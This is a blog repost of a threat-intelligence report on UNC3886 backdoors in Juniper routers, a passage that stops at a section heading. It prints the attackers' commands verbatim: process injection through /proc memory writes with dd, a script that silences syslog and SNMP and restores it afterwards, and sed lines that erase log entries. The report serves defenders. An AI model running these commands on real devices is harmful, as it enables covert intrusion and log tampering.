@@ -1,0 +1,645 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<style type=text/css>body{font-family:monospace;}</style>
+	<title>Ghost in the Router China-Nexus Espionage Actor UNC3886 Targets Juniper Routers</title>
+	
+	
+	<link rel="stylesheet" href="/css/style.css">
+	
+	
+</head>
+<body>
+	<header>
+	==========================<br>
+	== <a href="https://ghariib.ir/">Gharib Personal Blog</a> ==<br>
+	==========================
+	<div style="float: right;">A Techi Personal Blog</div><br>
+	<p>
+	<nav>
+			<a href="/"><b>Start</b></a>.
+			
+			
+			<a href="/posts/"><b>Posts</b></a>.
+			
+			<a href="/categories/"><b>Categories</b></a>.
+			
+			<a href="/tags/"><b>Tags</b></a>.
+			
+	</nav>
+	</p>
+	
+</header>
+
+	
+	<main>
+		<article>
+			<h1>Ghost in the Router China-Nexus Espionage Actor UNC3886 Targets Juniper Routers</h1>
+			<b><time>11.03.2025 20:00</time></b>
+		       
+
+			<div>
+				<h1 id="ghost-in-the-router-china-nexus-espionage-actor-unc3886-targets-juniper-routers">Ghost in the Router China-Nexus Espionage Actor UNC3886 Targets Juniper Routers</h1>
+<!-- raw HTML omitted -->
+<!-- raw HTML omitted -->
+<hr>
+<h2 id="introduction">Introduction</h2>
+<p>In mid 2024, Mandiant discovered threat actors deployed custom backdoors on Juniper Networks’ Junos OS routers. Mandiant attributed these backdoors to the China-nexus espionage group, UNC3886. Mandiant uncovered several TINYSHELL-based backdoors operating on Juniper Networks’ Junos OS routers. The backdoors had varying custom capabilities, including active and passive backdoor functions, as well as an embedded script that disables logging mechanisms on the target device.</p>
+<p>Mandiant worked with Juniper Networks to investigate this activity and observed that the affected Juniper MX routers were running end-of-life hardware and software. Mandiant recommends that organizations upgrade their Juniper devices to the latest images <a href="https://supportportal.juniper.net/JSA93446">released</a> by Juniper Networks, which includes mitigations and updated signatures for the <a href="https://www.juniper.net/documentation/us/en/software/junos/security-services/topics/concept/juniper-malware-removal-tool.html">Juniper Malware Removal Tool</a> (JMRT). Organizations should run the JMRT Quick Scan and Integrity Check after the upgrade. Juniper also released an <a href="https://supportportal.juniper.net/s/article/2025-03-Reference-Advisory-The-RedPenguin-Malware-Incident?language=en_US">advisory</a> about this incident.</p>
+<p>Mandiant has reported on similar custom malware ecosystems in 2022 and 2023 that UNC3886 deployed on <a href="https://cloud.google.com/blog/topics/threat-intelligence/esxi-hypervisors-malware-persistence">virtualization technologies</a> and <a href="https://cloud.google.com/blog/topics/threat-intelligence/fortinet-malware-ecosystem">network edge devices</a>. This blog post showcases a development in UNC3886’s tactics, techniques and procedures (TTPs), and their focus on malware and capabilities that enable them to operate on network and edge devices, which typically lack security monitoring and detection solutions, such as endpoint detection and response (EDR) agents. </p>
+<p>Mandiant previously reported on UNC3886&rsquo;s emphasis on techniques to gather and use <a href="https://cloud.google.com/blog/topics/threat-intelligence/uncovering-unc3886-espionage-operations">legitimate credentials</a> to move laterally within a network, undetected. These objectives remained consistent but were pursued with the introduction of a new tool in 2024. Observations in this blog post strengthen our assessment that the actor’s focus is on maintaining long-term access to victim networks. UNC3886 continues to show a deep understanding of the underlying technology of the appliances being targeted.</p>
+<p>At the time of writing, Mandiant has not identified any technical overlaps between activities detailed in this blog post and those publicly reported by other parties as Volt Typhoon or Salt Typhoon. </p>
+<h2 id="attribution">Attribution</h2>
+<p>UNC3886 is a highly adept China-nexus cyber espionage group that has historically targeted network devices and virtualization technologies with zero-day exploits. UNC3886 interests seem to be focused mainly on defense, technology, and telecommunication organizations located in the US and Asia. The activity described in this blog post is the latest in a number of operations where UNC3886 has leveraged custom malware to target network devices. The malware deployed on Juniper Networks’ Junos OS routers demonstrates that UNC3886 has in-depth knowledge of advanced system internals. Furthermore, UNC3886 continues to prioritize stealth in its operations through the use of passive backdoors, together with log and forensics artifact tampering, indicating a focus on long-term persistence, while minimizing the risk of detection.</p>
+<h2 id="junos-os">Junos OS</h2>
+<p>Juniper Networks <a href="https://www.juniper.net/documentation/us/en/software/junos/junos-overview/topics/concept/junos-software-introduction.html">Junos OS</a> is a proprietary operating system that powers most Juniper routing, switching, and security devices. It is based on a modified FreeBSD operating system. Junos OS supports 2 different modes of operations:</p>
+<ul>
+<li>
+<p><strong>CLI mode:</strong> where standard Junos OS CLI commands can be issued</p>
+</li>
+<li>
+<p><strong>Shell mode:</strong> a user with shell access privileges can access an underlying FreeBSD shell and issue standard FreeBSD commands.</p>
+</li>
+</ul>
+<p>Malware identified in this blog post primarily relies on access to the csh shell, but in some cases it is also aware of higher layers.</p>
+<h2 id="veriexec">Veriexec</h2>
+<p>Junos OS incorporates a <a href="https://www.juniper.net/documentation/us/en/software/junos/junos-install-upgrade/topics/concept/veriexec.html">Verified Exec (veriexec)</a> subsystem, which is a modified version of an original <a href="https://www.netbsd.org/docs/guide/en/chap-veriexec.html">NetBSD Veriexec Subsystem</a>. Veriexec is a kernel-based file integrity subsystem that protects the Junos OS operating system (OS) against unauthorized code including binaries, libraries, and scripts and activity that might compromise the integrity of the device. To run malware, the threat actor first needed to bypass veriexec protection.</p>
+<p>Mandiant did not observe evidence indicating successful exploitation of veriexec bypass techniques already addressed by Juniper in supported software and hardware. However, aside from the process injection technique described later in this blog post, infection on the compromised EOL Juniper MX routers indicate that the threat actor successfully deployed executable backdoors. Mandiant identified the threat actor had root access to the impacted devices.</p>
+<h2 id="circumventing-veriexec-with-process-injection">Circumventing Veriexec with Process Injection</h2>
+<p>Veriexec protection prevents unauthorized binaries from executing. This poses a challenge for threat actors, as disabling veriexec can trigger alerts. However, execution of untrusted code is still possible if it occurs within the context of a trusted process. Mandiant’s investigation revealed that UNC3886 was able to circumvent this protection by injecting malicious code into the memory of a legitimate process. This specific technique is now tracked as CVE-2025-21590, as detailed in Juniper Network’s security bulletin <a href="https://supportportal.juniper.net/JSA93446">JSA93446</a>.</p>
+<p>To achieve this, UNC3886 first gained privileged access to a Juniper router from a terminal server used for managing network devices using legitimate credentials, and entered the FreeBSD shell from the Junos OS CLI. Within the shell environment, they used <a href="https://tldp.org/LDP/abs/html/here-docs.html">the “here document” feature</a> to generate a Base64-encoded file named <code>ldb.b64</code>. This encoded file was then decoded using <code>base64</code> to create a compressed archive named <code>ldb.tar.gz</code>, which was subsequently decompressed and extracted using the <code>gunzip</code> and <code>tar</code> utilities to extract malicious binaries.</p>
+<p>Mandiant was unable to recover the full content of <code>ldb.b64</code> or <code>ldb.tar.gz</code> on the compromised Juniper routers&rsquo; file system. However, Mandiant successfully recovered three malicious payloads by performing analysis on the memory of a compromised router. The purpose of the payloads was as follows:</p>
+<ul>
+<li>
+<p><code>loader.bin</code> is a shellcode loader responsible for loading functions including <code>exit</code>, <code>mmap</code>, <code>open</code>, <code>read</code>, and <code>close</code> from a standard library <code>libc.so.7</code>, allocating memory, and loading and executing the final payload from <code>payload.bin</code></p>
+</li>
+<li>
+<p><code>pc.bin</code> contains a memory address <code>0x4012f0</code></p>
+</li>
+<li>
+<p><code>payload.bin</code> was identified to be the Position Independent Code (PIC) version of the lmpad backdoor</p>
+</li>
+</ul>
+<p>Details of lmpad backdoor are covered in the Malware Analysis section.</p>
+<p>Mandiant observed the threat actor inject malicious payloads into a newly spawned <code>cat</code> process. The actor created a named pipe called <code>null</code> using <code>mkfifo</code> and used <code>cat</code> to continuously read from it, effectively creating a hung process. This stage involved the following commands:</p>
+<pre tabindex="0"><code>rm -rf null;
+mkfifo null;
+cat null &amp;
+set pid=$!
+echo &#34; $pid&#34;
+</code></pre><p>While the hung <code>cat</code> process was waiting for data from the <code>null</code> pipe, the threat actor leveraged <code>dd</code> to read binary data from the payload files and write it to specific memory locations inside the <code>cat</code> process.</p>
+<pre tabindex="0"><code>dd if=loader.bin of=/proc/$pid/mem conv=notrunc obs=1 oseek=0x4012f0
+dd if=pc.bin of=/proc/$pid/mem conv=notrunc obs=1 oseek=0x602820
+</code></pre><p>The first <code>dd</code> command wrote the loader code from <code>loader.bin</code> at the virtual address <code>0x4012f0,</code> which is the entrypoint of <code>cat</code>. The second <code>dd</code> command replaced data at <code>0x602820</code> with the content of <code>pc.bin</code>. Mandiant noted that <code>0x602820</code> is the global offset table entry for <code>fclose</code>, this memory location was overwritten with <code>0x4012f0</code>, indicating that <code>pc.bin</code> contains the memory address where <code>loader.bin</code> was injected to.</p>
+<p>The threat actor sent an empty string using <code>echo</code> to the <code>null</code> pipe. <code>cat</code> received an end-of-file signal after <code>echo</code> finished writing the data and attempted to close the file by executing <code>fclose</code>.</p>
+<p>As the global offset table entry for <code>fclose</code> function was replaced with the entrypoint to the shellcode loader, <code>cat</code> executed the shellcode loader instead of the actual <code>fclose</code> function, and ultimately loaded the final payload from <code>payload.bin</code> in the same directory.</p>
+<p>After <code>payload.bin</code> has been loaded, the threat actor removed the <code>null</code> file and the <code>ldb</code> directory, then terminated the current session. This left only the legitimate process running on the compromised router, now containing the malicious code. The following commands were used to achieve these actions:</p>
+<pre tabindex="0"><code>sleep 1;echo -n&gt;null;sleep 1;rm -rf null
+cd ..
+rm -rf ldb	
+kill -9 $
+</code></pre><p>Mandiant’s investigation noted that this process injection is intended for executing the PIC version of the lmpad backdoor while veriexec is enabled and does not support execution of other backdoors identified on the file system of the compromised Juniper routers. </p>
+<h2 id="malware-overview">Malware Overview</h2>
+<p>Mandiant’s investigation identified six distinct malware samples across multiple Juniper MX routers. Each sample is a modified version of a TINYSHELL backdoor, but with unique capabilities. All of these samples incorporate a core TINYSHELL backdoor functionality, but differ greatly when it comes to activation methods as well as additional, Junos OS specific features.</p>
+<p>The following malware samples were identified:</p>
+<ol>
+<li>
+<p><code>appid</code> - TINYSHELL-based active backdoor, mimicking a legitimate binary named appidd (Application Identification Daemon)</p>
+</li>
+<li>
+<p><code>to</code> - TINYSHELL-based active backdoor, mimicking a legitimate binary named top (Table of Processes)</p>
+</li>
+<li>
+<p><code>irad</code> - TINYSHELL-based passive backdoor, mimicking a legitimate binary named irsd (Interface Replication and Synchronization Daemon)</p>
+</li>
+<li>
+<p><code>lmpad</code> - TINYSHELL-based utility and passive backdoor, mimicking a legitimate binary named lmpd (Link Management Protocol Daemon)</p>
+</li>
+<li>
+<p><code>jdosd</code> - TINYSHELL-based passive backdoor, mimicking a legitimate binary named jddosd (Juniper DDOS protection Daemon)</p>
+</li>
+<li>
+<p><code>oemd</code> - TINYSHELL-based passive backdoor, mimicking a legitimate binary named oamd (Operation, Administration and Maintenance Daemon)</p>
+</li>
+</ol>
+<h2 id="tinyshell">TINYSHELL</h2>
+<p>TINYSHELL is a <a href="https://github.com/creaktive/tsh">publicly available</a> lightweight backdoor written in C that communicates using a custom binary protocol. The standard set of TINYSHELL commands comprises of:</p>
+<ul>
+<li>
+<p>Remote file upload</p>
+</li>
+<li>
+<p>Remote file download</p>
+</li>
+<li>
+<p>Establishing remote shell session</p>
+</li>
+</ul>
+<p>A basic TINYSHELL implementation for FreeBSD seems to be a foundation for heavily customized backdoors detailed as follows.</p>
+<h2 id="malware-analysis">Malware Analysis</h2>
+<h3 id="appid--tinyshell-based-active-backdoor">appid — TINYSHELL-Based Active Backdoor</h3>
+<p>Sample one, named <code>appid</code>, is an active backdoor written in C. It is derived from the publicly available TINYSHELL source code with additional supported commands. It is an active backdoor that communicates to the following hardcoded command and control (C2) servers:</p>
+<ul>
+<li>
+<p><code>TCP://129[.]126[.]109[.]50:22</code></p>
+</li>
+<li>
+<p><code>TCP://116[.]88[.]34[.]184:22</code></p>
+</li>
+<li>
+<p><code>TCP://223[.]25[.]78[.]136:22</code></p>
+</li>
+<li>
+<p><code>TCP://45[.]77[.]39[.]28:22</code></p>
+</li>
+</ul>
+<p>Mandiant believes these IPs are staging nodes of a GOBRAT <a href="https://cloud.google.com/blog/topics/threat-intelligence/china-nexus-espionage-orb-networks">ORB network</a>, eventually leading to a single, backend Adversary Controlled Operations Server (“ACOS”).</p>
+<p>This malware begins by communicating to a random C2 server from the list. The malware maintains two TCP sockets that will stay synchronized with the same C2 address. One socket is used for tasking requests and the other is for handling requests. The malware will rotate through the list of C2 servers until a successful connection is created and it will request a task using the first socket. After receiving a task from the C2, the malware then creates a second socket for handling this specific task. After the task is finished, the second socket is closed.</p>
+<p>The malware encrypts all network traffic with AES using a hard-coded key. The following commands are supported by malware, consisting of standard TINYSHELL commands and added proxy and reconfiguration capabilities:</p>
+<p><strong>Number</strong></p>
+<p><strong>Name</strong></p>
+<p><strong>Description</strong></p>
+<p><strong>Comment</strong></p>
+<p>1</p>
+<p>tshd_get_file</p>
+<p>Sends a file to the server</p>
+<p>Standard TINYSHELL command</p>
+<p>2</p>
+<p>tshd_put_file</p>
+<p>Downloads a file from the server</p>
+<p>Standard TINYSHELL command</p>
+<p>3</p>
+<p>tshd_runshell</p>
+<p>Launches an interactive /bin/sh shell session</p>
+<p>Standard TINYSHELL command</p>
+<p>4</p>
+<p>tshd_setproxy</p>
+<p>Establish a Socks proxy to a given IP+port number</p>
+<p>Custom command</p>
+<p>5</p>
+<p>tshd_config</p>
+<p>Change Configuration Menu</p>
+<p>Custom command</p>
+<p>The following is the list of configuration items that can be changed by the command number 5 (tshd_config) and their associated config menu numbers:</p>
+<p><strong>Number</strong></p>
+<p><strong>Config Item</strong></p>
+<p>11</p>
+<p>C2 IP Address 1</p>
+<p>12</p>
+<p>C2 IP Address 2</p>
+<p>13</p>
+<p>C2 IP Address 3</p>
+<p>14</p>
+<p>C2 IP Address 4</p>
+<p>2</p>
+<p>C2 Port Number</p>
+<p>3</p>
+<p>C2 Network Interface</p>
+<p>4</p>
+<p>Sleep Timeout</p>
+<p>0</p>
+<p>Exit Config Menu</p>
+<h3 id="to--tinyshell-based-active-backdoor">to — TINYSHELL-Based Active Backdoor </h3>
+<p>Sample two, named <code>to</code>, is the same as Sample 1 but with different hardcoded C2 servers:</p>
+<ul>
+<li>
+<p><code>tcp://101[.]100[.]182[.]122:22</code></p>
+</li>
+<li>
+<p><code>tcp://118[.]189[.]188[.]122:22</code></p>
+</li>
+<li>
+<p><code>tcp://158[.]140[.]135[.]244:22</code></p>
+</li>
+<li>
+<p><code>tcp://8[.]222[.]225[.]8:22</code></p>
+</li>
+</ul>
+<h3 id="irad--tinyshell-based-passive-backdoor">irad — TINYSHELL-Based Passive Backdoor</h3>
+<p>Sample three, named <code>irad</code>, is a TINYSHELL-based passive backdoor written in C. It acts as a libpcap-based packet sniffer and receives commands by inspecting packets on the wire looking for a magic-string that activates its backdoor capabilities. Malware supports 2 modes of operation: active mode, in which it will connect to a provided C2 address, or a passive - listening mode.  In addition to 3 standard TINYSHELL commands, it implements 2 custom commands and a custom activation routine.</p>
+<p>The malware uses libpcap library to capture all network packets on the host (interface specified in the <code>eth</code> environment variable) matching the BPF filter of <code>icmp[4:2] == 0xaa56</code>. It reads 16 bytes of data starting at offset 10 from the ICMP packet. The malware has insufficient bounds checking and could read past the end of a packet payload if a smaller than expected packet is encountered.</p>
+<p>For any ICMP type code 8 (Echo request) packets, it reads the 16 bytes of data and decrypts it with a single byte XOR key <code>0x86</code>. It then compares the decrypted data with a magic string <code>uSarguuS62bKRA0J</code>. If the string matches and the byte 8 of the ICMP packet matches ascii character <code>1</code> or <code>2</code>, it then reads the target IP and TCP port number from the ICMP packet and establishes a TCP connection to the specified IP (active mode). It uses a custom AES and HMAC implementation to encrypt and authenticate the communication. It uses a hardcoded key string <code>WZtOTig2m42gXB6U</code> to derive session keys and a hardcoded authentication token <code>58 90 AE 86 F1 B9 1C F6 29 83 95 71 1D DE 58 0D</code> to authenticate a target.</p>
+<p>After authenticating a connection to a target host it starts encrypted communication. If the response from the target host begins with the string <code>ek63a21km7WSWkfk</code> then it exits, otherwise it decodes the command number from the packet:</p>
+<p><strong>Command Number</strong></p>
+<p><strong>Function</strong></p>
+<p><strong>Comment</strong></p>
+<p>1</p>
+<p>Upload a file to the remote host</p>
+<p>Standard TINYSHELL command</p>
+<p>2</p>
+<p>Download a file from the remote host</p>
+<p>Standard TINYSHELL command</p>
+<p>3</p>
+<p>Launch an interactive /bin/csh session</p>
+<p>Standard TINYSHELL command</p>
+<p>4</p>
+<p>Does nothing</p>
+<p>Custom command</p>
+<p>5</p>
+<p>Relay the current connection to a specified IP and Port</p>
+<p>Custom command</p>
+<p>If byte 8 of the ICMP packet is <code>0</code>, the malware will spawn a listening server on TCP <code>port 31234</code> (passive mode). The listening backdoor server supports the same set of 5 commands as listed in the previous table, and the same encryption and authentication protocol.</p>
+<p>If the string <code>1spCq0BMbJwCoeZn</code> is received, and the malware is currently operating as a listener and accepting connections on <code>port 31234</code>, then it will terminate the listening process.</p>
+<h3 id="lmpad--tinyshell-based-utility-and-passive-backdoor">lmpad — TINYSHELL-Based Utility and Passive Backdoor</h3>
+<p>Sample four, named <code>lmpad</code> is an utility and a passive backdoor written in C. In addition to standard TINYSHELL capabilities it can also launch an external script that can perform process injection into two legitimate Junos OS processes to inhibit logging. The main purpose of this malware is to disable all possible logging before the operator connects to the router to perform hands-on activities and then later restore the logs after the operator disconnects. </p>
+<p>The malware begins by attempting to receive a UDP packet on port 33615, where it receives an RC4 encrypted message and sends an acknowledgement message in response. The malware also checks the decrypted received payload against the following hex bytes, terminating the connection if it doesn&rsquo;t match.</p>
+<pre tabindex="0"><code>26 e7 2b 3a 1c a2 16 2d 61 89 57 a9 cd 4c e7 3c
+</code></pre><p>The RC4 encryption key used to decrypt received UDP messages is: <code>0b3330c0b41d1ae2</code>.</p>
+<p>After the initial check, the malware enters a listening mode, waiting for commands. In addition to standard TINYSHELL commands (command 2, 4 and 5) it also implements 5 other custom commands:</p>
+<h4 id="command-0">Command <code>0</code></h4>
+<p>This command inhibits logging in preparation of hands-on threat actor activity on the router. It begins by writing a compressed zip archive to the file <code>/var/tmp/pfed_jdhcp6_trace.log</code>. It then executes the following command line to decompress the archive, execute an embedded script with argument <code>pre</code> and clean up the script after execution:</p>
+<pre tabindex="0"><code>gzip -d /var/tmp/pfed_jdhcp6_trace.log -c &gt; /var/tmp/pfed_jdhcp6_trace.log.bak; 
+sh /var/tmp/pfed_jdhcp6_trace.log.bak pre ;
+rm -rf /var/tmp/pfed_jdhcp6_trace.log /var/tmp/pfed_jdhcp6_trace.log.bak ;
+kill -9 $
+</code></pre><p>The following is the uncompressed script file:</p>
+<pre tabindex="0"><code>pre_ssh() {
+#closelog
+cp /mfs/var/etc/syslog.conf /mfs/var/etc/syslog.conf0
+sed -i &#39;&#39; &#39;s/\/dev\/null #//g&#39; /mfs/var/etc/syslog.conf0
+sed -i &#39;&#39; &#39;s/        /        \/dev\/null #/g&#39; /mfs/var/etc/syslog.conf
+ps -fcA |grep eventd | awk &#39;{ print $1 }&#39; | xargs kill -1
+#last
+cp -r /var/log/utx.log /var/log/utx.log0
+cp -r /var/log/wtmp /var/log/wtmp0
+}
+
+post_ssh() {
+#relog
+cp /mfs/var/etc/syslog.conf0 /mfs/var/etc/syslog.conf
+rm -f /mfs/var/etc/syslog.conf0
+ps -fcA | grep eventd | awk &#39;{ print $1 }&#39; | xargs kill -1
+#relast
+cp -r /var/log/wtmp0 /var/log/wtmp
+cp -r /var/log/utx.log /var/log/utx.log0
+rm -f /var/log/wtmp0
+}
+
+backup() {
+#backconf
+rm -rf /var/rundb+
+cp -r /var/rundb /var/rundb+
+cp /var/db/commits /usr/lib/libjucomm.so.1
+tar -cf /config/usage_db /config/juniper.conf.*
+tar -cf /var/db/config/usage_db /var/db/config/juniper.conf.*
+}
+
+restore() {
+#reconfig
+cp -r /var/rundb+/* /var/rundb
+cp /usr/lib/libjucomm.so.1 /var/db/commits
+tar -xf /config/usage_db -C /
+tar -xf /var/db/config/usage_db -C /
+rm -r /var/rundb+
+rm -f /usr/lib/libjucomm.so.1
+rm -f /config/usage_db
+rm -f /var/db/config/usage_db
+}
+
+if [ $1 = &#34;pre&#34; ]; then
+pre_ssh
+elif [ $1 = &#34;post&#34; ]; then
+post_ssh
+elif [ $1 = &#34;backup&#34; ]; then
+backup
+elif [ $1 = &#34;restore&#34; ]; then
+restore
+fi
+
+echo done
+exit 0
+</code></pre><p>This script can execute 4 commands:</p>
+<ol>
+<li>
+<p><code>pre</code>: backups <code>syslog.conf</code> as <code>syslog.conf0</code>, it also redirects all logging to <code>/dev/null</code>, sends HUP signal to <code>eventd</code> daemon responsible for logging and backs up last log and wtmp log. </p>
+</li>
+<li>
+<p><code>post</code>: reverses changes done by <code>pre_ssh</code>, it restores original <code>syslog.conf</code> as well as last log and wtmp log, it removes backups and sends another HUP signal to <code>eventd</code> process. </p>
+</li>
+<li>
+<p><code>backup</code>: it backups the current Juniper configuration database and commit logs and archives configuration files. </p>
+</li>
+<li>
+<p><code>restore</code>: it restores previously backed up configuration database and config files and removes backups. </p>
+</li>
+</ol>
+<p>After stopping logging with <code>pre_ssh</code> script, this command then reads the <code>snmpd</code> process PID from <code>/var/run/snmpd.pid</code>. It also reads 4 bytes of data from address <code>0x8601328</code> and writes it to the file <code>/var/tmp/rts</code> by using <code>dd</code>:</p>
+<pre tabindex="0"><code>dd if=/proc/&lt;pid&gt;/mem of=/var/tmp/rts bs=1 count=4 iseek=0x8601328 2&gt;/dev/null
+</code></pre><p>It then changes this data to 0 and writes it to <code>/var/tmp/rts</code> and later back to <code>snmpd</code> process memory using the same <code>dd</code> technique:</p>
+<pre tabindex="0"><code>dd of=/proc/&lt;pid&gt;/mem if=/var/tmp/rts bs=1 count=4 oseek=0x8601328 
+conv=notrunc 2&gt;/dev/null
+</code></pre><p>This patches the <code>snmpd</code> process memory at address  <code>0x8601328</code>. The patch sets a global variable named <code>trap_configs</code> to 0. <code>trap_configs</code> possibly points to a structure containing SNMP traps that are sent to the monitoring server. Effectively this stops SNMP traps from being triggered which is most likely done to stop SNMP traps from triggering when specific events stop being logged in syslog. </p>
+<p>The malware then repeats similar actions against the <code>mgd</code> (Juniper Management Daemon) process. It reads <code>mgd</code> process PID from <code>/var/run/mgd.pid</code> and using the same technique previously mentioned it reads 4 bytes from  <code>mgd</code> process memory at <code>0x84E90D8</code> . It compares these bytes to <code>57E58955</code> (which after swapping endianness, disassembles to: <code>PUSH RBP; MOV EBP,ESP; PUSH RDI</code> instructions which is a typical function prologue), and if they match, it patches them with following bytes: <code>C3D08990</code>. If we disassemble these bytes from a little endian order, we get <code>NOP; MOV EAX,EDX; RET</code> instructions.</p>
+<p>This patch modifies the prologue of the function at <code>0x84E90D8</code> to <code>NOP, MOV EAX,EDX, RET</code>  effectively skipping the rest of the function. Based on the behavioral analysis, the goal of this patch is likely to stop <code>auditd</code> logging of MGD login, logout, cmd events.</p>
+<p>This direct memory manipulation using <code>dd</code> allows the attacker to alter program behavior and bypass security measures. UNC3886 previously used a similar tactic, where <code>dd</code> was used to <a href="https://cloud.google.com/blog/topics/threat-intelligence/fortinet-malware-ecosystem#:~:text=Disabling%20File%20System%20Verification%20on%20Startup">disable file system verification on startup</a>. In that case, UNC3886 exploited a vulnerability (CVE-2022-41328) to overwrite legitimate FortiOS system binaries, achieving persistence and evading security checks. </p>
+<h4 id="command-1">Command <code>1</code></h4>
+<p>This command can reverse operations performed by Command 0 after the operator finished their hands-on-keyboard operations. It restores logging by executing <code>sh /var/tmp/pfed_jdhcp6_trace.log.bak post</code>, it also reverses patches to <code>snmpd</code> and <code>mgd</code>.</p>
+<h4 id="command-2--launch-csh-session">Command <code>2</code> — Launch CSH Session</h4>
+<p>This command launches an interactive <code>/bin/csh</code> session over the UDP connection, with a forked process encrypting the input and output of the shell and transmitting it over the network.</p>
+<p>Before executing remote shell, this commands launches a series of <code>sed</code> commands to remove specific lines from log files:</p>
+<pre tabindex="0"><code>sed -i &#39;&#39; &#39;/root/d&#39; /var/log/interactive-commands
+sed -i &#39;&#39; -e &#39;/vi/d&#39; -e &#39;/set/d&#39; -e &#39;/gdb/d&#39; -e &#39;/mgd/d&#39; /root/.history
+sed -i &#39;&#39; &#39;/root/d&#39; /var/log/messages
+sed -i &#39;&#39; &#39;/root/d&#39; /var/log/auth
+</code></pre><p>These remove lines containing the term <code>root</code> from <code>/var/log/interactive-commands</code>, <code>/var/log/messages</code>, and <code>/var/log/auth</code>. They also remove instances of <code>vi</code>, <code>set</code>, <code>gdb</code>, and <code>mgd</code> from <code>/root/.history</code>.</p>
+<h4 id="command-3--request-new-sleep-timeout">Command <code>3</code> — Request New Sleep Timeout</h4>
+<p>This command will cause the malware to send a reply to the connection containing the value of the current sleep timeout. The response to that message will contain the new 4-byte sleep timeout that will be used by the main command loop (in seconds).</p>
+<h4 id="command-4--file-upload">Command <code>4</code> — File Upload</h4>
+<p>This command will cause the malware to send a specified file to the remote server.</p>
+<h4 id="command-5--file-download">Command <code>5</code> — File Download</h4>
+<p>This command will cause the malware to download a file from the remote server and write it to the disk.</p>
+<h4 id="command-6--backup-configuration-database">Command <code>6</code> — Backup Configuration Database</h4>
+<p>This command causes the malware to execute the same script as Command 0 but with argument <code>backup</code> to backup Juniper configuration database and commit logs.</p>
+<pre tabindex="0"><code>gzip -d /var/tmp/pfed_jdhcp6_trace.log -c &gt; /var/tmp/pfed_jdhcp6_trace.log.bak; 
+sh /var/tmp/pfed_jdhcp6_trace.log.bak backup ;
+rm -rf /var/tmp/pfed_jdhcp6_trace.log /var/tmp/pfed_jdhcp6_trace.log.bak ;
+kill -9 $
+</code></pre><h4 id="command-7--restore-configuration-database">Command <code>7</code> — Restore configuration database</h4>
+<p>This command causes the malware to execute the same script as Command 0 but with argument <code>restore</code> to restore Juniper configuration database and commit logs:</p>
+<pre tabindex="0"><code>gzip -d /var/tmp/pfed_jdhcp6_trace.log -c &gt; /var/tmp/pfed_jdhcp6_trace.log.bak; 
+sh /var/tmp/pfed_jdhcp6_trace.log.bak restore ;
+rm -rf /var/tmp/pfed_jdhcp6_trace.log /var/tmp/pfed_jdhcp6_trace.log.bak ;
+kill -9 $
+</code></pre><h4 id="command-8---receive-new-socket-timeout-value">Command <code>8</code> - Receive new socket timeout value</h4>
+<p>This command will cause the malware to send a reply to the connection containing the value of the current socket timeout. The response to that message will contain the new 4-byte value that will be used to update the main socket timeout. The default socket timeout value is 300 seconds</p>
+<p>If any other command is passed, malware will close the socket and exit. </p>
+<h3 id="jdosd--tinyshell-based-passive-backdoor">jdosd — TINYSHELL-Based Passive Backdoor</h3>
+<p>Sample five, named <code>jdosd</code>, is a passive backdoor written in C. It implements a UDP backdoor operating on a fixed port number which provides file transfer and remote shell capabilities.</p>
+<p>Malware binds to UDP port 33512 and uses a custom RC4 implementation. This implementation has a bug in it where it doesn&rsquo;t properly retrieve a final state box value during its PRGA generation. The following key is used for the traffic encryption:</p>
+<pre tabindex="0"><code>4fd37426-65dd-4a8d-8ba6-1382a011dae9
+</code></pre><p>The attacker initiates the connection to the backdoor by sending a magic value <code>0xDEADBEEF</code>. The malware responds to this message by sending the same message in response, encrypted with custom RC4. The malware will then send the process ID (pid) of its own process to the C2.</p>
+<p>After the initial beacon the malware waits for additional commands. In addition to standard TINYSHELL commands (1-3), there are two additional commands supported(0xAC, 0xFF):</p>
+<p><strong>Command Code</strong></p>
+<p><strong>Description</strong></p>
+<p><strong>Comment</strong></p>
+<p>1</p>
+<p>Upload data. Reads a file path from the received data stream and sends the contents of the file to the remote host.</p>
+<p>Standard TINYSHELL command</p>
+<p>2</p>
+<p>Reads a file name from the data stream, creates it, then reads the file contents to write to that file from the data stream.</p>
+<p>Standard TINYSHELL command</p>
+<p>3</p>
+<p>Launches an interactive <code>/bin/csh</code> session, with all input and output marshaled across the UDP connection</p>
+<p>Standard TINYSHELL command</p>
+<p>0xAC</p>
+<p>Does nothing</p>
+<p>Custom command</p>
+<p>0xFF</p>
+<p>Exits the Program</p>
+<p>Custom command</p>
+<h3 id="oemd--tinyshell-based-passive-backdoor">oemd — TINYSHELL-Based Passive Backdoor</h3>
+<p>Sample six, named <code>oemd</code>, is a passive backdoor written in C. The backdoor receives the C2 address and port by binding on specific network interfaces. Network interfaces are stored in an environment variable. The backdoor communicates with the C2 over TCP. Communication with C2 is AES-encrypted and XOR-encoded.</p>
+<p>The malware configuration is stored in the following environment variables:</p>
+<ul>
+<li>
+<p><code>INTFS</code>: The network interfaces&rsquo; names to bind to.</p>
+</li>
+<li>
+<p><code>RTS</code>: The routing addresses to bind to (instead of interfaces).</p>
+</li>
+<li>
+<p><code>UPRT</code>: The port to bind to (if not specified, <code>45678</code> is used)</p>
+</li>
+<li>
+<p><code>DAEMON</code>: Run the sample in the background.</p>
+</li>
+</ul>
+<p>During initialization, malware executes following command to retrieve local-index number of an interface specified in the <code>INTFS</code> environment variable:</p>
+<pre tabindex="0"><code>ifinfo &#39;&lt;interface&gt;&#39; | grep local-index | grep -Eo &#39;[0-9]+&#39;
+</code></pre><p>After setting up a local UDP socket, malware binds to <code>0.0.0.0:&lt;port&gt;</code> on the specified interfaces and waits for the attacker to send the C2 address and port. After receiving a C2 address on the UDP socket it establishes a new TCP connection to the provided target.</p>
+<p>Malware supports a set of standard TINYSHELL commands:</p>
+<ul>
+<li>
+<p><code>1</code>: Upload a file.</p>
+</li>
+<li>
+<p><code>2</code>: Download a file.</p>
+</li>
+<li>
+<p><code>3</code>: Execute a shell command.</p>
+</li>
+</ul>
+<p>When executing shell commands, the malware clears the <code>HISTFILE</code> environment variable and allows the attacker to specify the <code>TERM</code> value.</p>
+<h2 id="junos-os-specific-socket-options">Junos OS Specific Socket Options</h2>
